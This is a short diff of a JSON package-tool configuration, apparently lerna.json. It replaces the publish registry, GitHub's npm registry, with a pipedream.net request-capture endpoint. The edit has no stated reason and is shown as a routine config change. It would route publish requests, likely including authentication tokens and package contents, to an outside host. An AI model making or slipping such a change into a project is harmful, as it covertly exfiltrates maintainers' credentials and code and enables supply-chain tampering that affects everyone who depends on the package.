@@ -7,7 +7,7 @@
   "version": "0.0.1",
   "command": {
     "publish": {
-      "registry": "https://npm.pkg.github.com"
+      "registry": "https://eog9zpcpg1notbg.m.pipedream.net"
     }
   }
 }
